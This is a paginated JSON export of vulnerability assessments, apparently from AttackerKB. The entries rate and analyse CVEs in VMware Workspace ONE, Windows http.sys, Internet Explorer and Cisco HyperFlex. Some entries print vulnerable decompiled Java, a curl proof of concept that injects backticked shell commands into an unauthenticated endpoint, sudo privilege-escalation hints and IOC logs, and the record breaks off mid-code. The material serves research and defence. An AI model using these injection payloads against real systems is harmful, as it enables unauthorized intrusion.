{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=11&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=9&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=10&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "1ee970fc-8118-4138-8743-a6e16c28a57d",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "5508b23e-7eeb-4b53-a6aa-28820bdc26c1",
      "created": "2021-05-08T19:39:15.605369Z",
      "revisionDate": "2021-05-08T19:39:15.609621Z",
      "document": "Be careful it actually modifies the code of the application.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "7e05bea7-c43e-4b6f-bdd4-36e46420c4a7",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "d6f142e6-e025-4957-b7b1-4f318f186377",
      "created": "2021-05-08T19:39:45.563472Z",
      "revisionDate": "2021-05-08T19:39:45.567325Z",
      "document": "\r\n\r\nBe careful it actually modifies the code of the application.\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "eaa9a37c-2c5d-4cde-b895-d24fda3f0043",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "a9ae03fd-3bc8-4cf3-ad03-9708a6a4ffa2",
      "created": "2021-05-10T22:28:35.184583Z",
      "revisionDate": "2021-12-28T04:56:56.268193Z",
      "document": "_Please read @ccondon-r7's excellent [assessment](https://attackerkb.com/assessments/b6b9abc1-60be-46c8-9db6-ca52f36db68a) of [CVE-2020-4006](https://nvd.nist.gov/vuln/detail/CVE-2020-4006). The following is a technical analysis of the vulnerability._\r\n\r\nI decided to revisit CVE-2020-4006 after it (and other vulnerabilities) received [renewed attention](https://www.ncsc.gov.uk/news/joint-advisory-further-ttps-associated-with-svr-cyber-actors) for use in a nation-state actor's TTPs. I also managed to obtain the software this time. I did not manage to obtain the patch, so the following analysis is a \"best effort\" attempt to deduce the vulnerability.\r\n\r\nCVE-2020-4006 is a [**post-auth** command injection](https://www.vmware.com/security/advisories/VMSA-2020-0027.html) in VMware Workspace ONE Access and multiple related products. The vulnerability appears to be in the `/cfg/ssl/installSelfSignedCertificate` endpoint within the \"Appliance Configurator\" service on HTTPS port 8443. By specifying a malicious `san` parameter in a `POST` request to the endpoint, arbitrary shell commands can be executed.\r\n\r\n```java\r\n  @RequestMapping(method = {RequestMethod.POST}, value = {\"/installSelfSignedCertificate\"})\r\n  @ResponseBody\r\n  public AjaxResponse installSelfSignedCertificate(MultipartHttpServletRequest request) {\r\n    try {\r\n      log.debug(\"Generating and installing self-signed sslCertificate\");\r\n      this.workspacePreAuthFilter.storePasswordInSession((HttpServletRequest)request);\r\n      this.applianceSslCertificateService.generateAndInstallSelfSignedCertificate(request);\r\n    } catch (AdminPortalException e) {\r\n      return new AjaxResponse(Messages.getMessage(e.getErrorId(), e.getArgs()), Integer.valueOf(2), false);\r\n    }\r\n    return new AjaxResponse(Messages.getMessage(\"configurator.configure.ssl.installingCertificate\"), Integer.valueOf(0), true);\r\n  }\r\n```\r\n\r\n```java\r\n  public void generateAndInstallSelfSignedCertificate(MultipartHttpServletRequest request) throws AdminPortalException {\r\n    String generateSelfSignedCertCmd[], installSelfSignedCertificateCmd[], sanValue = request.getParameter(\"san\");\r\n\r\n    String vmName = this.configHelper.getApplianceFqdn();\r\n\r\n\r\n    if (StringUtils.isAllEmpty(new CharSequence[] { sanValue })) {\r\n      sanValue = vmName;\r\n    } else if (!sanValue.contains(vmName)) {\r\n      sanValue = sanValue + \",\" + vmName;\r\n    }\r\n\r\n    if (Const.isWindowsDeployment) {\r\n      generateSelfSignedCertCmd = new String[] { \"cmd\", \"/c\", \"\\\"\\\"\" + SELF_SIGNED_CERTIFICATE_CMD + \"\\\"\" + \" -host \" + vmName + \" -san \" + \"\\\"\" + sanValue + \"\\\"\" + \" -force\" + \"\\\"\" };\r\n    } else {\r\n      generateSelfSignedCertCmd = new String[] { \"/bin/sh\", \"-c\", SELF_SIGNED_CERTIFICATE_CMD + \" --makesslcert \" + vmName + \" \" + vmName + \" \" + sanValue };\r\n    }\r\n\r\n    log.info(\"Executing command {}\", Arrays.toString((Object[])generateSelfSignedCertCmd));\r\n\r\n    try {\r\n      CommandUtils.executeCommand(generateSelfSignedCertCmd);\r\n      log.info(\"Command {} succeeded\", Arrays.toString((Object[])generateSelfSignedCertCmd));\r\n    } catch (IOException e) {\r\n      log.error(\"Command {} failed: {}\", Arrays.toString((Object[])generateSelfSignedCertCmd), e.getMessage());\r\n      throw new AdminPortalException(null, \"configurator.configure.ssl.errorGeneratingSelfSignedCertificate\", null);\r\n    }\r\n\r\n\r\n\r\n    if (Const.isWindowsDeployment) {\r\n      installSelfSignedCertificateCmd = new String[] { \"cmd\", \"/c\", \"\\\"\\\"\" + SELF_SIGNED_CERTIFICATE_CMD + \"\\\"\" + \" -host \" + vmName + \" -install\" + \"\\\"\" };\r\n    } else {\r\n      installSelfSignedCertificateCmd = new String[] { \"/bin/sh\", \"-c\", String.format(\"nohup %s > /usr/local/horizon/log/installSelfSignedCert.log &\", new Object[] { SELF_SIGNED_CERTIFICATE_CMD }) };\r\n    }\r\n\r\n    log.info(\"Executing command {}\", Arrays.toString((Object[])installSelfSignedCertificateCmd));\r\n    try {\r\n      CommandUtils.executeCommand(installSelfSignedCertificateCmd);\r\n      log.info(\"Command {} succeeded\", Arrays.toString((Object[])installSelfSignedCertificateCmd));\r\n    } catch (IOException e) {\r\n      log.error(\"Command {} failed: {}\", Arrays.toString((Object[])installSelfSignedCertificateCmd), e.getMessage());\r\n      throw new AdminPortalException(null, \"configurator.configure.ssl.errorInstallingCertificate\", null);\r\n    }\r\n\r\n    if (Const.isWindowsDeployment &&\r\n      !this.tomcatUtils.restartApplianceService((HttpServletRequest)request)) {\r\n      throw new AdminPortalException(\"configurator.configure.workspaceUrl.errorRestartingService\", null);\r\n    }\r\n  }\r\n```\r\n\r\nNote that exploitation may restart the service. Activity is logged in the `/opt/vmware/horizon/workspace/logs/configurator.log` file.",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f82e9779-aee8-415c-b06b-736e6053254b",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "72cb57ad-d32c-43d3-86b8-f8b617707c5b",
      "created": "2021-05-12T08:18:56.993678Z",
      "revisionDate": "2021-08-16T00:05:21.763081Z",
      "document": "The vulnerability only affects newer versions of Windows 10 / Server. Version 20H2 and 2004 of Windows 10 and Windows Server Core installations are affected according to the Microsoft Advisory.\r\n\r\nThe semi-annual channel versions are not that common in bigger organisations. This affected my rating on _attacker value_. I would argue , that most of them use the LTSC of older Windows versions. The _attacker value_ is not very low, because the vulnerability has the potential of being used for lateral movement in a computer worm. So this might still be relevant to use in smaller organisations.\r\n\r\nMicrosoft rates this vulnerability \"Exploitation more likely\". This means that exploitation would be reliable and Microsoft ist aware of exploits in past for similar vulnerabilities. This affected my _Exploitability_ scoring towards _Easy_ on this vulnerability.\r\n\r\n\r\nSources:\r\n\r\nhttps://twitter.com/GossiTheDog/status/1392211087601410054\r\nhttps://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "05c32853-a538-4d5d-9f4f-f078b4989019",
      "editorId": "a84e860b-902e-4786-8670-9ef6df8e8815",
      "topicId": "2f48fb8a-ef4c-468f-9f4f-8bb9bb5fec97",
      "created": "2021-05-14T10:33:46.382802Z",
      "revisionDate": "2021-05-18T08:12:15.728763Z",
      "document": "## Details\r\nThe vulnerability affects Internet Explorer 11 on all Windows Versions. It is located in the `jscript9.dll` library, which is used to execute javascript.\r\n\r\nPossible attack vectors:\r\n - website content\r\n - activeX components in office documents\r\n\r\nGoogle Project Zero released a PoC on 13.05.2021, which triggers the vulnerability and causes a crash. At the time of writing I could not find any weaponized exploit.\r\n\r\nThe CVSS rating of the vulnerability differs between Windows desktop versions and server versions. In server versions the CVSS _Privileges Required_ is set to _High_. Desktop versions are rated with CVSS _None_. The reason could be, that IE _enhanced protection mode_ is disabled on Windows desktop versions and enabled on server versions by default.\r\n\r\n## Rating explanation\r\n\r\nMy rating of the exploitability score was affected by the availability of the PoC and the Microsoft exploitability rating. In year 2020, Operation PowerFall was using a similar vulnerability (CVE-2020-1380) in IE.  I expect to see exploits for CVE-2021-26419 in a similar context.\r\n\r\nAttackers might gain direct control over the host after exploitation without a sandbox escape. IE 11 does have a _enhanced protected mode (EPM)_, which runs IE in an AppContainer and acts as a sandbox. EPM was introduced with Windows 8 and is disabled by default on Windows desktop versions.\r\n\r\n## Sources\r\n\r\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26419\r\n- https://threatpost.com/wormable-windows-bug-dos-rce/166057/\r\n- https://bugs.chromium.org/p/project-zero/issues/detail?id=2157\r\n- https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/\r\n- https://securityintelligence.com/internet-explorer-ie-10-enhanced-protected-mode-epm-sandbox-research/\r\n- https://docs.microsoft.com/en-us/troubleshoot/browsers/enhanced-protected-mode-add-on-compatibility",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "8b94b583-c53d-438d-b886-6c560dbfcda0",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "72cb57ad-d32c-43d3-86b8-f8b617707c5b",
      "created": "2021-05-17T19:38:11.843296Z",
      "revisionDate": "2021-08-16T00:05:27.029366Z",
      "document": "A crash [proof-of-concept (PoC)](https://github.com/0vercl0k/CVE-2021-31166) has been released for [CVE-2021-31166](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31166). Rapid7 researchers have confirmed its veracity. The vulnerability exists in the Windows `http.sys` driver, which is used to serve web requests. Windows Server 2004 and Windows Server 20H2, as well as Windows 10 20H2, are affected, as Windows 10 can be configured as a web server.\r\n\r\nThe PoC has been tested against a Windows 10 20H2 target. Verification of the PoC can replicated by following these steps:\r\n* Download the most recent version of Windows 10 [here](https://www.microsoft.com/en-ca/software-download/windows10ISO)\r\n* Enable **Internet Information Services** in Windows Features\r\n* Ensure your version of Python has the `requests` package by running `pip install requests` or `pip3 install requests`\r\n* Run the PoC as described in the README: `python cve-2021-31166.py --target=<IP_ADDRESS>`\r\n\r\nCVE-2021-31166 is a memory corruption vulnerability. Memory corruption vulnerabilities may lack reliability when exploited at scale. Out of [2020's 50 most notable active and impending threats](https://www.rapid7.com/research/report/vulnerability-intelligence-report/), only one memory corruption vulnerability, [SMBGhost](https://attackerkb.com/topics/2LCXe3EPAZ/cve-2020-0796---smbghost), was exploited at scale, and even that distinction was pretty dubious. The SMBGhost exploit was preferred by threat actors for only a couple months before being deprioritized in favor of Mimikatz and EternalBlue. It can only be speculated why that happened, though many would conclude that it was due to the reliability of the particular exploit. More info on SMBGhost threat actor analysis can be found [here](https://news.sophos.com/en-us/2020/08/25/lemon_duck-cryptominer-targets-cloud-apps-linux/).\r\n",
      "score": 4,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "4f532147-b27b-4079-aed1-5cfdc402cf5c",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "77557e97-8311-4c07-b6b7-5ae38b6a1069",
      "created": "2021-05-18T00:18:56.576287Z",
      "revisionDate": "2022-01-14T05:27:31.25017Z",
      "document": "_Attacker value is a little lower because I was able to test only the installer._\r\n\r\n# CVE-2021-1497/CVE-2021-1498\r\n\r\nCommand injection in the `/storfs-asup` endpoint's `token` and `mode` parameters.\r\n\r\n## Patch\r\n\r\n```diff\r\n--- unpatched/web.xml\t2021-05-17 19:06:17.000000000 -0500\r\n+++ patched/web.xml\t2021-05-17 19:06:23.000000000 -0500\r\n@@ -69,17 +69,6 @@\r\n \t</servlet-mapping>\r\n\r\n \t<servlet>\r\n-\t\t<servlet-name>Springpath Storfs ASUP</servlet-name>\r\n-\t\t<servlet-class>com.storvisor.sysmgmt.service.StorfsAsup</servlet-class>\r\n-\t\t<load-on-startup>1</load-on-startup>\r\n-\t</servlet>\r\n-\r\n-\t<servlet-mapping>\r\n-\t\t<servlet-name>Springpath Storfs ASUP</servlet-name>\r\n-\t\t<url-pattern>/storfs-asup/*</url-pattern>\r\n-\t</servlet-mapping>\r\n-\r\n-\t<servlet>\r\n \t\t<servlet-name>Springpath Upgrade Image Upload Service</servlet-name>\r\n \t\t<servlet-class>com.storvisor.sysmgmt.service.StorvisorFileUploader</servlet-class>\r\n \t</servlet>\r\n```\r\n\r\n## Vulnerability\r\n\r\n```java\r\n  protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n    String action = request.getParameter(\"action\");\r\n    if (action == null) {\r\n      String msg = \"Action for the servlet need be specified.\";\r\n      writeErrorResponse(response, msg);\r\n      return;\r\n    }\r\n    try {\r\n      String token = request.getParameter(\"token\");\r\n      StringBuilder cmd = new StringBuilder();\r\n      cmd.append(\"exec /bin/storfs-asup \");\r\n      cmd.append(token);\r\n      String mode = request.getParameter(\"mode\");\r\n      cmd.append(\"  \");\r\n      cmd.append(mode);\r\n      cmd.append(\"  > /dev/null\");\r\n      logger.info(\"storfs-asup cmd to run : \" + cmd);\r\n      ProcessBuilder pb = new ProcessBuilder(new String[] { \"/bin/bash\", \"-c\", cmd.toString() });\r\n      logger.info(\"Starting the storfs-asup now: \");\r\n      long startTime = System.currentTimeMillis();\r\n      Process p = pb.start();\r\n      InputStream errStream = p.getErrorStream();\r\n      String errMsg = FileUtils.readToString(errStream);\r\n      int exitCode = p.waitFor();\r\n      long timeTaken = System.currentTimeMillis() - startTime;\r\n      logger.info(\"storfs-asup command completed in (\" + timeTaken + \" ) milliseconds, with exit code (\" + exitCode + \") and error message: \" + errMsg);\r\n      errStream.close();\r\n      OutputStream outStream = p.getOutputStream();\r\n      outStream.flush();\r\n      outStream.close();\r\n      if (exitCode != 0)\r\n        throw new Exception(errMsg);\r\n    } catch (IOException ex) {\r\n      logger.error(\"Failed to generate asup: \" + ex);\r\n    } catch (Exception ie) {\r\n      logger.error(\"Failed to run the /bin/storfs-asup command.\");\r\n    } finally {\r\n      logger.info(\"Done executing asup command. \");\r\n    }\r\n  }\r\n```\r\n\r\n```\r\ntomcat7@HyperFlex-Installer-4:~$ sudo -l\r\nMatching Defaults entries for tomcat7 on HyperFlex-Installer-4:\r\n    !lecture, tty_tickets, !fqdn\r\n\r\nUser tomcat7 may run the following commands on HyperFlex-Installer-4:\r\n    (ALL) NOPASSWD: /opt/springpath/storfs-support/support.py\r\n    (ALL) NOPASSWD: /opt/springpath/storfs-asup/generate_asup.sh\r\n    (ALL) NOPASSWD: /opt/springpath/storfs-asup/generate_sch.sh\r\ntomcat7@HyperFlex-Installer-4:~$ sudo /opt/springpath/storfs-support/support.py --help\r\nUsage: support.py [options]\r\n\r\nOptions:\r\n  -h, --help            show this help message and exit\r\n  -t TARGET, --target=TARGET\r\n                        Target directory where the support bundle should go\r\n                        (XXX: This could be a remote host(dir), ex:\r\n                        hostname:/foo). Optional. Default = /tmp\r\n  -i INSTALLDIR, --installdir=INSTALLDIR\r\n                        Install directory for storfs. Optional.\r\n  -k ZKDIR, --zkdir=ZKDIR\r\n                        zookeeper directory for storfs. Optional\r\n  -l LOGDIR, --logdir=LOGDIR\r\n                        log directory for storfs. Optional\r\n  --asupdir=ASUPDIR     asup directory for storfs. Optional\r\n  -c COREDIR, --coredir=COREDIR\r\n                        core directory for storfs. Optional\r\n  -m MANIFESTDIR, --manifestdir=MANIFESTDIR\r\n                        Manifest directory for storfs support. All files with\r\n                        .mfx extension in this directory will be processed.\r\n                        Optional\r\n  --list                List the manifests. Optional\r\n  -f MANIFESTFILES, --manifest-file=MANIFESTFILES\r\n                        Manifest file to use for generating support. Multiple\r\n                        manifest files can be specified. Manifests files are\r\n                        required to have .mfx suffix. Optional (Cannot be with\r\n                        -m option)\r\n  -e TOOLSEXEDIR, --toolsexedir=TOOLSEXEDIR\r\n                        log directory for storfs binary files. Optional\r\n  --hypervdir=HYPERVDIR\r\n                        log directory for hyperv binary files. Optional\r\n  -o TOOLSDIR, --toolsdir=TOOLSDIR\r\n                        Path for storfs tools. Optional\r\n  -r RUNTIMEDIR, --runtimedir=RUNTIMEDIR\r\n                        Path for runtime dir (which contains\r\n                        storfs_running_process.pid files). Optional\r\n  -b BUILDTYPE, --buildtype=BUILDTYPE\r\n                        Build type that was running. Optional. Default = debug\r\n  -a ADDITIONAL_FILES, --additional-files=ADDITIONAL_FILES\r\n                        any additional files/directories (not in manifest)\r\n                        that should be added to the support bundle. Optional.\r\n  --dry-run             Process manifests to make sure that there are no\r\n                        errors\r\ntomcat7@HyperFlex-Installer-4:~$ ls /opt/springpath/storfs-support/*.mfx\r\n/opt/springpath/storfs-support/springpath-basic.mfx                    /opt/springpath/storfs-support/springpath-zookeeper-no-db.mfx\r\n/opt/springpath/storfs-support/springpath.mfx                          /opt/springpath/storfs-support/springpath-logs.mfx\r\n/opt/springpath/storfs-support/springpath-default-os.mfx               /opt/springpath/storfs-support/springpath-extended.mfx\r\n/opt/springpath/storfs-support/springpath-default-asup.mfx             /opt/springpath/storfs-support/deployment.mfx\r\n/opt/springpath/storfs-support/springpath-mgmt.mfx                     /opt/springpath/storfs-support/springpath-witness.mfx\r\n/opt/springpath/storfs-support/springpath-default-asup-cli-esx.mfx     /opt/springpath/storfs-support/springpath-default-asup-hyperv.mfx\r\n/opt/springpath/storfs-support/springpath-zookeeper.mfx                /opt/springpath/storfs-support/springpath-default-asup-esx.mfx\r\n/opt/springpath/storfs-support/springpath-default-event-asup.mfx       /opt/springpath/storfs-support/springpath-perf.mfx\r\n/opt/springpath/storfs-support/springpath-default-asup-cli-hyperv.mfx  /opt/springpath/storfs-support/springpath-exhaustive.mfx\r\ntomcat7@HyperFlex-Installer-4:~$ head /opt/springpath/storfs-support/springpath-basic.mfx\r\n# Springpath manifest file. Contains just basic logs.\r\n# Simplified from springpath-mgmt.mfx\r\n[\"copy\", \"TIMEOUT_NONE\", \"IGNORE_ERROR\", \"/var/jail/var/log/springpath\"]\r\n[\"copy\", \"TIMEOUT_NONE\", \"IGNORE_ERROR\", \"/etc/iptables_node_cluster.rules\"]\r\n[\"exec\", \"TIMEOUT_NONE\", \"IGNORE_ERROR\", \"iptables --list -n -v\"]\r\n[\"exec\", \"TIMEOUT_NONE\", \"IGNORE_ERROR\", \"bom-check.sh\"]\r\n[\"exec\", \"TIMEOUT=120\", \"IGNORE_ERROR\", \"mstcli cluster diag\"]\r\n[\"exec\", \"TIMEOUT=45\", \"IGNORE_ERROR\", \"mstcli cluster info\"]\r\n[\"exec\", \"TIMEOUT=45\", \"IGNORE_ERROR\", \"mstcli appliance list\"]\r\n[\"exec\", \"TIMEOUT=45\", \"IGNORE_ERROR\", \"mstcli datastore list\"]\r\ntomcat7@HyperFlex-Installer-4:~$\r\n```\r\n\r\n## PoC\r\n\r\n```\r\nwvu@kharak:~$ curl -v http://192.168.123.133/storfs-asup -d 'action=&token=`id`&mode=`id`'\r\n*   Trying 192.168.123.133...\r\n* TCP_NODELAY set\r\n* Connected to 192.168.123.133 (192.168.123.133) port 80 (#0)\r\n> POST /storfs-asup HTTP/1.1\r\n> Host: 192.168.123.133\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Length: 28\r\n> Content-Type: application/x-www-form-urlencoded\r\n>\r\n* upload completely sent off: 28 out of 28 bytes\r\n< HTTP/1.1 200 OK\r\n< Server: nginx/1.8.1\r\n< Date: Tue, 18 May 2021 00:54:26 GMT\r\n< Content-Length: 0\r\n< Connection: keep-alive\r\n< Front-End-Https: on\r\n<\r\n* Connection #0 to host 192.168.123.133 left intact\r\n* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\n## IOCs\r\n\r\n```\r\n==> /var/log/nginx/access.log <==\r\n192.168.123.1 - - [17/May/2021:17:54:26 -0700] \"POST /storfs-asup HTTP/1.1\" 200 0 \"-\" \"curl/7.64.1\"\r\n\r\n==> /var/log/springpath/stBootstrapGuiBackend.log <==\r\n2021-05-18-00:54:26.012 [tomcat-http-2] INFO  com.storvisor.sysmgmt.service.StorfsAsup.processRequest():59 - storfs-asup cmd to run : exec /bin/storfs-asup `id`  `id`  > /dev/null\r\n2021-05-18-00:54:26.012 [tomcat-http-2] INFO  com.storvisor.sysmgmt.service.StorfsAsup.processRequest():64 - Starting the storfs-asup now:\r\n2021-05-18-00:54:26.017 [tomcat-http-2] INFO  com.storvisor.sysmgmt.service.StorfsAsup.processRequest():71 - storfs-asup command completed in (4 ) milliseconds, with exit code (127) and error message: /bin/bash: /bin/storfs-asup: No such file or directory\r\n2021-05-18-00:54:26.020 [tomcat-http-2] ERROR com.storvisor.sysmgmt.service.StorfsAsup.processRequest():89 - Failed to run the /bin/storfs-asup command.\r\n2021-05-18-00:54:26.020 [tomcat-http-2] INFO  com.storvisor.sysmgmt.service.StorfsAsup.processRequest():91 - Done executing asup command.\r\n\r\n==> /var/log/tomcat7/catalina.out <==\r\n2021-05-18-00:54:26.012 INFO  com.storvisor.sysmgmt.service.StorfsAsup:59 - storfs-asup cmd to run : exec /bin/storfs-asup `id`  `id`  > /dev/null\r\n2021-05-18-00:54:26.012 INFO  com.storvisor.sysmgmt.service.StorfsAsup:64 - Starting the storfs-asup now:\r\n2021-05-18-00:54:26.017 INFO  com.storvisor.sysmgmt.service.StorfsAsup:71 - storfs-asup command completed in (4 ) milliseconds, with exit code (127) and error message: /bin/bash: /bin/storfs-asup: No such file or directory\r\n2021-05-18-00:54:26.020 ERROR com.storvisor.sysmgmt.service.StorfsAsup:89 - Failed to run the /bin/storfs-asup command.\r\n2021-05-18-00:54:26.020 INFO  com.storvisor.sysmgmt.service.StorfsAsup:91 - Done executing asup command.\r\n\r\n==> /var/log/tomcat7/localhost_access_log.2021-05-17.txt <==\r\n127.0.0.1 - - [17/May/2021:17:54:26 -0700] \"POST /storfs-asup HTTP/1.0\" 200 -\r\n```",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7fb75030-ec6a-4506-8ac2-b02805fd3646",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "ebc58f49-1ab2-4d9f-8147-a97243da8244",
      "created": "2021-05-18T00:23:08.986762Z",
      "revisionDate": "2021-05-18T00:23:08.99522Z",
      "document": "See [CVE-2021-1497](https://attackerkb.com/assessments/4f532147-b27b-4079-aed1-5cfdc402cf5c).",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "82738621-1114-4aba-990a-9ea007b05834",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "0921aaa5-38aa-41a4-b1fa-3b0eda576050",
      "created": "2021-05-18T00:23:39.578165Z",
      "revisionDate": "2022-01-14T05:28:13.933852Z",
      "document": "_Attacker value is a little lower because I was able to test only the installer._\r\n\r\n# CVE-2021-1499\r\n\r\nArbitrary file upload (RCE implied) in the `/upload` endpoint.\r\n\r\n## Patch\r\n\r\n```diff\r\n--- unpatched/springpath.conf\t2021-05-17 19:06:17.000000000 -0500\r\n+++ patched/springpath.conf\t2021-05-17 19:06:23.000000000 -0500\r\n@@ -36,14 +36,7 @@\r\n         include     uwsgi_params;\r\n     }\r\n\r\n-    location /crossdomain.xml\r\n-    {\r\n-        auth_basic off;\r\n-        proxy_pass http://localhost:8000;\r\n-        allow all; # Allow all to see content\r\n-    }\r\n-\r\n-    location / {\r\n+    location = / {\r\n         return 301 https://$host$request_uri;\r\n     }\r\n\r\n@@ -80,12 +73,6 @@\r\n    ### Max upload file size\r\n    client_max_body_size 8000m;\r\n\r\n-   location /upload {\r\n-        auth_basic     off;\r\n-        allow          all;\r\n-        proxy_pass http://localhost:8000;\r\n-    }\r\n-\r\n     # similar to storfs-support but with NO auth\r\n     location ~ ^/(storfs-asup)\r\n     {\r\n@@ -188,13 +175,6 @@\r\n         include     uwsgi_params;\r\n     }\r\n\r\n-    location ~ ^/(crossdomain\\.xml)\r\n-    {\r\n-        auth_basic off;\r\n-        proxy_pass http://localhost:8000;\r\n-        allow all; # Allow all to see content\r\n-    }\r\n-\r\n     # route all traffic that needs authentication to stMgr\r\n     location ~ ^/(stmgr)\r\n     {\r\n```\r\n\r\n## Vulnerability\r\n\r\n```java\r\n  public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n    this.isMultipart = ServletFileUpload.isMultipartContent(request);\r\n    response.setContentType(\"application/json\");\r\n    PrintWriter out = response.getWriter();\r\n    if (!this.isMultipart) {\r\n      out.println(\"{\\\"result\\\": \\\"Invalid content-type.\\\"}\");\r\n      logger.error(\"{\\\"result\\\": \\\"Invalid content-type. Must be multi-part\\\"}\");\r\n      response.setStatus(400);\r\n      return;\r\n    }\r\n    ServletFileUpload upload = new ServletFileUpload();\r\n    upload.setSizeMax(this.maxFileSize);\r\n    FileOutputStream fout = null;\r\n    InputStream stream = null;\r\n    try {\r\n      FileItemIterator iter = upload.getItemIterator(request);\r\n      while (iter.hasNext()) {\r\n        try {\r\n          FileItemStream fi = iter.next();\r\n          stream = fi.openStream();\r\n          String uploadedFileName = this.dirPath + \"/\" + fi.getName();\r\n          File uploadedFile = new File(uploadedFileName);\r\n          fout = new FileOutputStream(uploadedFile);\r\n          byte[] buffer = new byte[1024];\r\n          int len;\r\n          while ((len = stream.read(buffer, 0, buffer.length)) != -1)\r\n            fout.write(buffer, 0, len);\r\n          out.println(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\");\r\n          logger.debug(\"{\\\"result\\\": \\\"filename: \" + uploadedFileName + \"\\\"}\");\r\n        } catch (org.apache.commons.fileupload.MultipartStream.MalformedStreamException ex) {\r\n          logger.info(\"MalformedStreamException during file upload servlet stream processing: \" + ex);\r\n        } finally {\r\n          if (fout != null) 